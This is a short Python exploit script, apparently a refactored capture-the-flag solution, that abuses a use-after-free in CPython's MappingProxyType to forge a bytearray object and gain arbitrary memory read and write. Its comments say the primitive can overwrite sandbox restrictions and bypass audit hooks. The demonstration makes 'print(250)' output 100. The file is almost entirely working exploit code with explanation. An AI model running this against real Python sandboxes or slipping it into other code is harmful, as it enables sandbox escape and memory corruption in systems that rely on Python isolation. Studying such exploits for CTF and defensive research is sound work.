# This program exploits a Use-After-Free vulnerability in MappingProxyType,
# based on https://bugs.python.org/issue43838. Refactored from @kmh's solution
# to the "irs" task from DiceCTF 2024 Quals.

# Initialize a large byte string for later.
before_mem = b'A' * 0x10000

class UAF:
    # Initialize the buffer that will be used for the exploit. Note that this
    # will be stored right after `ba` in memory. Once `mem` is freed, we will
    # overwrite its contents with a fake bytearray that allows for arbitrary
    # write access.
    mem = b'B' * 0x10000

    def __eq__(self, obj):
        del obj['mem']

# Not sure why this is necessary, but it probably has something to do with
# compiler optimizations causing `mem` to not being initialized unless we
# explicitly tell it to.
UAF.mem

# Trigger the UAF. After this, `mem` will be freed, yet still be accessible.
UAF.__dict__ == UAF()

# Now free the byte string that we defined earlier. This opens up a new memory
# location that we hope will be replaced by the fake bytearray.
del before_mem

# If all goes well, the fake bytearray will be placed in the same location as
# `ba`, exactly 0x10010 bytes before the start of `mem`. We proceed by filling
# up the first 0x10018 bytes with 'A's, which overflows into ob_refcnt. Nothing
# bad should happen by setting ob_refcnt to a large value. The rest of the bytes
# continue to turn `mem` into a bytearray by defining the necessary struct
# fields. In particular, we set the pointer to 0x0 and size to 2^63-1, which
# allows us to read and write to any address in virtual memory.
fake_bytearray = (
    # Py_ssize_t ob_refcnt;
    b'A' * 0x10018 +
    # struct _typeobject *ob_type;
    id(bytearray).to_bytes(8, 'little') +
    # Py_ssize_t ob_size, ob_alloc;
    (2**63 - 1).to_bytes(8, 'little') * 2 +
    # char *ob_bytes, *ob_start;
    (0).to_bytes(8, 'little') * 2 +
    # int ob_exports;
    (0).to_bytes(8, 'little')
)

# From here, we can do whatever we want (overwrite sandbox restrictions, bypass
# audit hooks, etc.), but here's one comical example:
UAF.mem[id(250) + 24] = 100
print(250)  # -> prints '100'
